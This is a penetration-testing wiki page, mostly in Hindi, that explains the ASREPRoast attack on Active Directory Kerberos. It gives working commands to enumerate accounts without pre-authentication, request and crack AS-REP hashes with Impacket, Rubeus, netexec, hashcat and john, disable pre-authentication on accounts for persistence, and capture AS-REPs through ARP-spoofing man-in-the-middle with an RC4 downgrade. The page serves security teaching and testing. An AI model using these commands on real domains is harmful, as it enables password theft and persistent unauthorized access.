# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast एक सुरक्षा हमला है जो उन उपयोगकर्ताओं का फायदा उठाता है जिनमें **Kerberos pre-authentication required attribute** नहीं होता। मूलतः यह भेद्यता हमलावरों को Domain Controller (DC) से किसी उपयोगकर्ता के लिए authentication अनुरोध करने की अनुमति देती है बिना उपयोगकर्ता के पासवर्ड की आवश्यकता के। DC तब उपयोगकर्ता के password-derived key से एन्क्रिप्ट किया हुआ संदेश भेजता है, जिसे हमलावर ऑफ़लाइन क्रैक करने की कोशिश कर सकते हैं ताकि उपयोगकर्ता का पासवर्ड पता चल सके।

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: लक्ष्य उपयोगकर्ताओं के पास यह सुरक्षा सुविधा सक्षम नहीं होनी चाहिए।
- **Connection to the Domain Controller (DC)**: हमलावरों को अनुरोध भेजने और एन्क्रिप्टेड संदेश प्राप्त करने के लिए DC तक पहुँच की आवश्यकता होती है।
- **Optional domain account**: एक domain account होने पर हमलावर LDAP queries के माध्यम से कमजोर उपयोगकर्ताओं की पहचान अधिक प्रभावी ढंग से कर सकते हैं। ऐसे account के बिना, हमलावरों को usernames का अनुमान लगाना होगा।

#### कमजोर उपयोगकर्ताओं की पहचान (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP संदेश का अनुरोध
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus के साथ AS-REP Roasting एक 4768 उत्पन्न करेगा जिसमें encryption type 0x17 और preauth type 0 होगा।

#### त्वरित एक-लाइनर (Linux)

- संभावित लक्ष्यों को पहले सूचीबद्ध करें (e.g., from leaked build paths) Kerberos userenum के साथ: `kerbrute userenum users.txt -d domain --dc dc.domain`
- एक single user की AS-REP भी खींचें भले ही पासवर्ड **खाली** हो, उपयोग करके `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec LDAP signing/channel binding posture भी प्रिंट करता है).
- Crack करें `hashcat out.asreproast /path/rockyou.txt` – यह स्वतः **-m 18200** (etype 23) AS-REP roast hashes के लिए पहचान लेता है।

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### स्थायी पहुँच

जहाँ आपके पास **GenericAll** अनुमतियाँ (या properties लिखने की अनुमतियाँ) हों, उस उपयोगकर्ता के लिए Force **preauth** आवश्यक नहीं होता:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast बिना क्रेडेंशियल्स के

एक हमलावर man-in-the-middle स्थिति का उपयोग करके नेटवर्क में गुजरते समय AS-REP packets को कैप्चर कर सकता है, इस पर निर्भर किए बिना कि Kerberos pre-authentication disabled है या नहीं। इसलिए यह VLAN पर सभी उपयोगकर्ताओं के लिए काम करता है.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) हमें ऐसा करने की अनुमति देता है। इसके अलावा, यह टूल Kerberos negotiation को बदलकर client workstations को RC4 का उपयोग करने के लिए मजबूर करता है।
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
